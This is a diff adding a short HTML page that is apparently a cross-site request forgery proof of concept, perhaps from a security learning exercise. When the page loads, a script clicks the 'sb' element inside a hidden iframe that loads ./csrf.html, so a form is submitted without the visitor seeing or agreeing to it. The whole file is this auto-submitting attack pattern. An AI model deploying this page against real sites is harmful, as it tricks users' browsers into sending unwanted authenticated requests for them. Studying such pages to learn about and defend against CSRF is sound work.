@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script type="text/javascript" >
+        function csrf() {
+            var obj = window.top.frames[0].document.getElementById('sb').click();
+            console.log(obj);
+        }
+    </script>
+</head>
+<body onload="csrf()">
+<iframe name="csrf" src="./csrf.html" style="visibility: hidden"></iframe>
+</body>
+</html>
